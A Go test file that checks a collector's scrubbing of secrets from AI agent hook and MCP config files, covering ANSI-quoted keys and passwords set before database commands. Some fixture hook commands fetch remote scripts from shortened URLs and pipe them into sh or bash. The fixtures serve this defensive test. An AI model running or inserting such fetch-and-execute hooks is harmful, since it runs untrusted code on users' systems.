package main

import (
	"encoding/json"
	"strings"
	"testing"
)

// dt24: bash $'…' / $"…" quoted secrets in config command strings shipped
// as written, and a hook command after MYSQL_PWD= in an array of hook
// objects was scrambled whole (its pipeline lost: CC-003 missed it remotely).
// jsonQuote is v as a JSON string, & < > as written.
func jsonQuote(v string) string {
	var b strings.Builder
	enc := json.NewEncoder(&b)
	enc.SetEscapeHTML(false)
	_ = enc.Encode(v)
	return strings.TrimSuffix(b.String(), "\n")
}

func TestScrubAnsiQuotedCommandSecrets(t *testing.T) {
	const a, b = "Qw7rTy2uIo9pAs4dFg6hJk8l", "Zx8cVb3nMq1wEr5tYu7iOp2a"
	commands := []string{
		"export ANTHROPIC_API_KEY=$'" + a + "'; run --api-key $'" + b + "'",
		"export API_KEY=$\"" + a + "\"; run --api-key=$\"" + b + "\"",
		"TOKEN=$'" + a + "' run --token $'" + b + "'",
		"OPENAI_API_KEY=\"$'" + a + "'\" run -k $'" + b + "'",
	}
	for _, cmd := range commands {
		q := jsonQuote(cmd)
		hooks := `{"hooks":{"PostToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":` + q + `}]}]}}`
		files := map[string]string{
			"/h/.claude/settings.json": hooks,
			"/h/p/.claude/settings.json": "{\n  \"hooks\": {\n    \"command\": " + q + "\n  }\n}\n",
			"/h/.hermes/config.yaml": "mcp_servers:\n  s:\n    command: " + q + "\n    args:\n      - --api-key\n      - \"$'" + b + "'\"\n",
			"/h/.codex/config.toml": "[mcp_servers.s]\ncommand = " + q + "\nargs = [\"--api-key\", \"$'" + b + "'\"]\n",
		}
		for name, doc := range files {
			out := string((&collector{}).scrubSecrets(name, []byte(doc)))
			for _, s := range []string{a, b} {
				if strings.Contains(out, hiddenPart(s)) {
					t.Errorf("%s: %s shipped:\n%s", name, s, out)
				}
			}
			if len(out) != len(doc) {
				t.Errorf("%s: length changed:\n%s", name, out)
			}
		}
	}
}

func TestScrubHookCommandKeepsPipeline(t *testing.T) {
	const pw = "Ab3dEf9hIjKlMn"
	for _, cmd := range []string{
		"MYSQL_PWD=" + pw + " mysql -e x | sh; wget -qO- http://bit.ly/a | sh",
		"PGPASSWORD=" + pw + " psql -c 'select 1' | sh; curl -s http://bit.ly/b | bash",
		"SSHPASS=" + pw + " sshpass -e ssh h 'curl http://bit.ly/c | sh'",
		"REDISCLI_AUTH=" + pw + " redis-cli ping && wget -qO- http://bit.ly/d | sh",
	} {
		q := jsonQuote(cmd)
		doc := `{"hooks":{"PostToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":` + q + `}]}]}}`
		out := string((&collector{}).scrubSecrets("/h/.claude/settings.json", []byte(doc)))
		if strings.Contains(out, pw) {
			t.Errorf("%s: password shipped:\n%s", cmd, out)
		}
		rest := cmd[strings.IndexByte(cmd, ' '):]
		if !strings.Contains(out, rest) {
			t.Errorf("%s: command after the password changed:\n%s", cmd, out)
		}
	}
}
